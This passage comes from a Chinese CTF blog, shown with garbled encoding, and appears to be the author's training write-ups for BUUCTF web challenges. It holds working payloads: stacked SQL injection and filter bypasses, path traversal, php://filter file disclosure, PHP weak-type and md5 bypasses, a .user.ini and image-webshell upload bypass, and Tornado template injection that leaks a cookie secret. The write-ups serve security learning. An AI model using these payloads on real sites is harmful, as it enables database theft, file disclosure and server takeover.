&lt;æ—§å­—æ®µå&gt; &lt;æ–°å­—æ®µå&gt; &lt;æ–°æ•°æ®ç±»å‹&gt;;ã€‘alter table words change flag id varchar(100);\n\nPayload 1# æ›´æ”¹è¡¨åã€å­—æ®µå1&#x27;;rename table words to bye;rename table `1919810931114514` to words;alter table words change flag id varchar(100);## çˆ†æ•°æ®1&#x27; or 1=1#\n\né¢„å¤„ç†è¯­å¥+å †å æ³¨å…¥è¿™ç§åŠæ³•ä¸»è¦æ˜¯å¯¹selectçš„è¿‡æ»¤è¿›è¡Œç»•è¿‡ã€‚é¢„å¤„ç†è¯­å¥ä½¿ç”¨æ–¹å¼:\nPREPARE name from &#x27;[my sql sequece]&#x27;;   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQL        è¯­å¥\n\né¢„å®šä¹‰è¯­å¥ä¹Ÿå¯ä»¥é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’:\nSET @tn = &#x27;hahaha&#x27;;  //å­˜å‚¨è¡¨åSET @sql = concat(&#x27;select * from &#x27;, @tn);  //å­˜å‚¨SQLè¯­å¥PREPARE name from @sql;   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥\n\nç„¶ååˆ©ç”¨char()å‡½æ•°å°†selectçš„ASCIIç è½¬æ¢ä¸ºselectå­—ç¬¦ä¸²ï¼Œæˆ–ç›´æ¥ç”¨concat()å‡½æ•°æ‹¼æ¥selectæ¥ç»•è¿‡å°±å¯ä»¥äº†ã€‚\nPayload 21&#x27;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#\n\n\nå‚è€ƒè¿™ä½å¸ˆå‚…çš„WriteUp: [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ WriteUp(three way)\n\n2023-01-24 WP\nT5 [HCTF 2018]WarmUpé¢˜ç›®åœ°å€\nä¸€é“ç®€å•çš„PHPä»£ç å®¡è®¡ã€‚æ£€æŸ¥å¾—åˆ°æç¤ºâ€™source.phpâ€™ï¼Œè®¿é—®ç»™å‡ºæºç :\n&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;\n\nè§£é¢˜æ€è·¯è®¿é—®â€™hint.phpâ€™è¢«å‘ŠçŸ¥â€flag not here, and flag in ffffllllaaaaggggâ€ï¼Œç”¨æºä»£ç ä¸­çš„includeæ–‡ä»¶åŒ…å«å°±èƒ½æ‰“å¼€ã€‚é¦–å…ˆå®ƒå…ˆåˆ¤å®šäº†ä¼ å…¥çš„æ˜¯ä¸æ˜¯ç©ºæˆ–è€…æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œç„¶åç”¨emmm::checkFileè¿›è¡Œäº†ä¸‰æ¬¡ç™½åå•åˆ¤æ–­:\nmb_substr(    string $str,    int $start,    int $length = NULL,    string $encoding = mb_internal_encoding())ä»startå¼€å§‹æˆªå–ä¸€å®šé•¿åº¦çš„å­—ç¬¦ä¸²strpos(    string $haystack,     string $needle,     int $offset = 0)è¿”å› needle åœ¨ haystack ä¸­é¦–æ¬¡å‡ºç°çš„æ•°å­—ä½ç½®\n\nç¬¬ä¸€æ¬¡$_pageå–çš„æ˜¯ä»0ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦ï¼‰å¼€å§‹åˆ°ç¬¬ä¸€æ¬¡å‡ºç° ? ä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒæ¬¡$_pageå–çš„æ˜¯$pageçš„urlè§£ç åä»0å¼€å§‹åˆ°ç¬¬ä¸€æ¬¡å‡ºç° ? ä¹‹é—´çš„å­—ç¬¦ä¸²ã€‚\n\näº‹å®ä¸Šï¼Œè¶…å…¨å±€å˜é‡$GETå’Œ$REQUESTå·²ç»è¢«è§£ç è¿‡äº†ã€‚\n\nåªéœ€è¦æ·»åŠ ä¸€ä¸ªhint.php?ç»•è¿‡ç™½åå•è¿‡æ»¤ï¼Œç„¶ååˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å°±èƒ½æˆåŠŸè¯»åˆ°flagäº†ã€‚\nPayload?file=hint.php?../../../../../../../../ffffllllaaaagggg\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"é›†è®­WriteUp-3","url":"/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/","content":"2023-01-28 WP\nT1 [ACTF2020 æ–°ç”Ÿèµ›]Includeé¢˜ç›®åœ°å€\nç‚¹å‡»tipsè·³è½¬ï¼Œurlä¸ºhttp://6d3271bd-e229-4cb6-8d9f-14c45ac78c60.node4.buuoj.cn:81/?file=flag.phpï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸èƒ½ç›´æ¥è¯»å‡ºflagï¼Œç”¨PHPä¼ªåè®®è®¿é—®å…¶æºç :\nphp://filter/convert.base64-encode/resource=æ–‡ä»¶å\n\nPayload?file=php://filter/convert.base64-encode/resource=flag.php\n\nå¾—åˆ°flag.phpæºç çš„base64ç¼–ç ï¼Œè§£ç åæ‰¾åˆ°flag:\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjU5ZGFmNzUtMjUxOS00MDZhLWI2ZjUtNGI5ZWUzOWZmZDQ3fQo=è§£ç ç»“æœ:&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;659daf75-2519-406a-b6f5-4b9ee39ffd47&#125;\n\n\næ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£\n\n2023-02-01 WP\nT2 [MRCTF2020]Ez_bypassé¢˜ç›®åœ°å€\nè€ƒç‚¹ï¼šmd5()ç¢°æ’ï¼ŒPHPå¼±ç±»å‹æ¯”è¾ƒ\nç»™å‡ºæºç :\nI put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You got the first step&#x27;;        if(isset($_POST[&#x27;passwd&#x27;])) &#123;            $passwd=$_POST[&#x27;passwd&#x27;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#x27;Good Job!&#x27;;                     highlight_file(&#x27;flag.php&#x27;);                     die(&#x27;By Retr_0&#x27;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#x27;You can not get it !&#x27;;            &#125;        &#125;        else&#123;            die(&#x27;only one way to get the flag&#x27;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#x27;Please input first&#x27;);&#125;&#125;Please input first\n\nè§£é¢˜æ€è·¯è¦æ±‚$idä¸$ggçš„md5å€¼ç›¸åŒï¼Œè€Œæœ¬èº«å€¼ä¸åŒã€‚è¿™ä¸€ç‚¹å¯ä»¥åˆ©ç”¨md5()æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆmd5()å‡½æ•°è¿”å›çš„éƒ½æ˜¯falseæ¥å®ç°ã€‚\næ¥ä¸‹æ¥éœ€è¦ç»•è¿‡is_numeric()ä¼ å…¥$passwdï¼Œå¹¶ä¸1234567è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚æ ¹æ®PHPå¼±ç±»å‹æ¯”è¾ƒçš„ç‰¹æ€§ï¼Œ&#39;1234567a&#39; == &#39;1234567&#39;ï¼Œä»è€ŒåŒæ—¶ç»•è¿‡äº†is_numeric()å‡½æ•°ã€‚\n\nè‹¥ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæˆ–è€…è¿›è¡Œè¿ç®—æ—¶ï¼ŒPHPä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚è‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œåˆ™è½¬æ¢ä¸º0ï¼ˆä¾‹å¦‚â€aaaâ€æ˜¯ä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œè€Œâ€123â€æˆ–â€123aaâ€å°±æ˜¯å¯ä»¥è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼‰\n\nPayloadGET?gg[]=1&amp;&amp;id[]=2POSTpasswd=1234567a\n\n\nhttps://blog.csdn.net/u014029795/article/details/99709333\n\n2023-02-01 WP\nT3 [SUCTF 2019]CheckIné¢˜ç›®åœ°å€\nä¼ é©¬è¯•ä¸€è¯•ï¼š\n\n\nå›æ˜¾â€illegal suffix!â€ï¼Œéœ€è¦æ”¹åç¼€ã€‚\n\nillegal suffix:ä¸èƒ½ä¸Šä¼ åç¼€ä¸ºphpã€php4ã€php5ã€phtmlç­‰å¯ç›´æ¥è¢«è§£æçš„PHPæ–‡ä»¶\n\næˆ‘ä»¬æ”¹ä¸ºâ€™webshell.jpgâ€™å†æ¬¡å°è¯•ä¸€ä¸‹ï¼Œç»“æœå›æ˜¾â€&lt;?  in contents!â€ï¼Œç”¨scriptè¿‡æ»¤ä¸€ä¸‹ï¼š\n\n\næç¤ºæˆ‘ä»¬â€exif_imagetype:not image!â€ï¼Œå¯å°è¯•ç”¨GIF89aæ–‡ä»¶å¤´æ¬ºéª—çš„æ–¹å¼ç»•è¿‡\n\nexif_imagetype:è¡¨ç¤ºåˆ¤æ–­ä¸€ä¸ªå›¾ç‰‡çš„ç±»å‹ï¼ˆå³è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼‰\n\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ æˆåŠŸï¼Œä¸”å‘ŠçŸ¥æˆ‘ä»¬ä¸Šä¼ è·¯å¾„â€uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fdâ€ã€‚ä¸‹ä¸€æ­¥è€ƒè™‘å°†å…¶è§£æä¸ºphpæ–‡ä»¶ï¼Œå…ˆç”¨ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶çš„åŠæ³•å°†.jpgåç¼€çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æï¼š\n.htaccessï¼ˆåŒæ ·åŠ ä¸ŠGIF89aæ–‡ä»¶å¤´ï¼‰GIF89aAddtype application/x-httpd-php .jpg\n\nç„¶è€Œè¿™æ ·ä¸è¡Œï¼Œå¯èƒ½æ˜¯æ²¡æœ‰å¼€æ”¾AllowOverride  Allï¼Œå°è¯•å…¶ä»–åŠæ³•ã€‚\n\nAllowOverride  All    # å¯åŠ¨.htaccessæ–‡ä»¶çš„ä½¿ç”¨\n\nä¸€äº›å…³äºuser.iniçš„çŸ¥è¯†.user.iniæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx&#x2F;apache&#x2F;IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚\nPHPé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹ï¼ˆä¸‹å›¾ç¬¬ä¸€ã€å››ä¸ªï¼‰ï¼š\n\n\nå…¶ä¸­çš„auto_prepend_fileè¡¨ç¤ºæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š\nauto_prepend_file=webshell.jpg\n\nä»è€Œå¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼ˆè¿™é‡Œå³â€™webshell.jpgâ€™ï¼‰ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshell. å½“ç„¶ï¼Œå‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚\nè¿™é‡Œæ°å¥½æ»¡è¶³æ¡ä»¶ï¼Œæˆ‘ä»¬ä¸Šä¼ .user.iniæ–‡ä»¶ï¼š\nGIF89aauto_prepend_file=webshell.jpg\n\nç„¶åä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬webshell.jpgï¼Œç”¨èšå‰‘è¿æ¥â€uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;index.phpâ€å³å¯ã€‚\n\nuser.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨\n\n2023-02-02 WP\nT4 [æŠ¤ç½‘æ¯ 2018]easy_tornadoé¢˜ç›®åœ°å€\nè€ƒç‚¹ï¼šæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ï¼ŒTornado æ˜¯ä½¿ç”¨ Python å¼€å‘çš„å…¨æ ˆå¼ï¼ˆfull-stackï¼‰Web æ¡†æ¶å’Œå¼‚æ­¥ç½‘ç»œåº“ã€‚ä¸ä»¥å‰æåˆ°è¿‡çš„ Flask ä¸€æ ·éƒ½æ˜¯ Python çš„ä¸€ç§ Web å¼€å‘æ¡†æ¶ã€‚Tornado render æ˜¯ Python ä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹ render å†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥ XSS ä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡ &#123;&#123;&#125;&#125; è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚\nä¸‰ä¸ªæ–‡ä»¶ï¼Œç”¨GETæ–¹å¼è®¿é—®ï¼Œå¦‚flag.txt : â€œfile?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;27bc54e1e85bcd53729ca9fc2c325cc7â€\n/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename))\n\nä¸ä¼ å‚è®¿é—®â€fileâ€ä¼šæ¥åˆ°Erroré¡µé¢error?msg=Errorï¼Œä¿®æ”¹msgå‚æ•°ä¸º&#123;&#123;1&#125;&#125;ï¼Œå‘ç°å­˜åœ¨SSTIæ¼æ´\n\n\nå¦‚æœè¦è®¿é—®/fllllllllllllagï¼ŒåŠ¿å¿…è¦å…ˆå¼„æ¸…æ¥šå®ƒçš„filehashæ˜¯ä»€ä¹ˆï¼Œ&#x2F;hints.txtæç¤ºæˆ‘ä»¬å¯èƒ½æ˜¯cookie_secret+md5(filename)çš„md5å€¼ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥è¦æ‰¾çš„å°±æ˜¯cookie_secretçš„å€¼ã€‚\n\ncookie_secret æ˜¯å­˜åœ¨äº settings ä¸­çš„ï¼Œsettings åˆä½œä¸ºå‚æ•°ä¼ å…¥äº† Application æ„é€ å‡½æ•°ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ self.application.settings æ¥è·å–åˆ° cookie_secretã€‚åˆå› ä¸ºæ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œ RequestHandler.settings çš„åˆ«åæ˜¯ self.application.settingsï¼Œä¸” handler æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„ RequestHandler å¯¹è±¡ï¼Œæ•…æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ handler.settings æ¥å¾—åˆ° cookie_secret çš„å€¼ã€‚\n\nè·å–cookie_secreterror?msg=&#123;&#123;handler.settings&#125;&#125;\n\n\n\nè®¡ç®—md5è®¡ç®—md5å€¼å³å¯ï¼š\nimport hashlibcookie=&#x27;f7119331-0e70-4070-b8b5-e72a76fd878f&#x27;filename=&#x27;/fllllllllllllag&#x27;md5_filename=hashlib.md5(filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()word=cookie+md5_filenameflag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()print(flag)## 303175bc3fca5948d03a5f9688fbde51\n\nPayload/file?filename=/fllllllllllllag&amp;filehash=303175bc3fca5948d03a5f9688fbde51\n\n\nXCTFç³»åˆ— &#x2F;&#x2F; Web | easytornado\n\n2023-02-02 WP\nT5 [GYCTF2020]Blacklisté¢˜ç›®åœ°å€\nä¸ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ å¾ˆç±»ä¼¼ï¼Œæ— æ³•ç”¨è”åˆæŸ¥è¯¢ï¼Œé€‰æ‹©å †å æ³¨å…¥ã€‚ä¸åŒç‚¹åœ¨äºè¿™é‡Œalterç­‰ä¿®æ”¹è¡¨åçš„å‘½ä»¤å’ŒPREPAREé¢„å¤„ç†å‘½ä»¤ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚\nreturn preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject);\n\nå…ˆæŸ¥è¡¨åï¼š\n1&#x27;;show tables;#\n\nå¾—åˆ°â€FlagHereâ€å’Œâ€wordsâ€ä¸¤ä¸ªè¡¨ï¼Œèƒ½å¦ç›´æ¥ä¾é &#x2F;**&#x2F;ç»•è¿‡æ£€æŸ¥å‘¢ï¼Ÿ\n1&#x27;;sel/**/ect flag from `FlagHere`;#\n\nç»“æœæ˜¯å•¥ä¹Ÿæ²¡æœ‰ã€‚\nå­¦ä¹ ä¸€ç§æ–°çš„æ“ä½œ HANDLER :\n\nHANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­\n\nä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ä¾‹:\nHANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE\n\näºæ˜¯ä¿®æ”¹Payload\nPayload1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#\n\n\n-çœ¼é‡Œæœ‰æ˜Ÿæ²³- [GYCTF2020]Blacklist\n\n2023-02-03 WP\nT6 [GXYCTF2019]BabyUploadé¢˜ç›®åœ°å€\nä¸Šä¼ åç¼€ä¸èƒ½å«æœ‰phï¼Œä¸”æ–‡ä»¶å†…å®¹è¿‡æ»¤&lt;?ï¼Œåˆ©ç”¨ script + .hatcessæ–‡ä»¶ + å›¾ç‰‡é©¬ è¿›è¡Œç»•è¿‡\nå›¾ç‰‡é©¬ä¸Šä¼ æˆåŠŸï¼Œå¹¶ç»™å‡ºäº†ä¸Šä¼ è·¯å¾„â€&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;6cdfb1db05f2e76413034fd35b6cd993&#x2F;webshell.jpgâ€ï¼Œä¸Šä¼ .hatcessæ–‡ä»¶æ—¶è¢«æ£€æµ‹å‡ºä¸Šä¼ ç±»å‹â€œæ¼éª¨â€ï¼Œè¿™é‡Œä¿®æ”¹ä¸€ä¸‹Content-Type: image/jpegï¼Œä¹ŸæˆåŠŸä¸Šä¼ ã€‚\nå°è¯•ç›´æ¥ç”¨èšå‰‘è¿æ¥ï¼ŒæˆåŠŸæ‰¾åˆ°Flag.\nhttp://d03a8dc5-50d1-4555-87af-0bfcede2efc4.node4.buuoj.cn:81/upload/6cdfb1db05f2e76413034fd35b6cd993/webshell.jpg\n\n\nåšè¿™é¢˜æœ¬æ¥æ˜¯çœ‹åˆ°æœ‰ä¸ªwpå†™ç€systemè¢«ç¦ç”¨äº†ï¼Œæƒ³å­¦ä¸€ç‚¹å…¶ä»–æŠ€å·§ï¼Œæ²¡æƒ³åˆ°èšå‰‘ç›´æ¥è¿ä¸Šäº†â€¦â€¦è¿™é‡Œä¹Ÿè¡¥å……ä¸€ä¸‹å­:\n\nshow_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºfile_get_contents() æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­\n\n","categories":["Write Up"],"tags":["CTF","web"]}]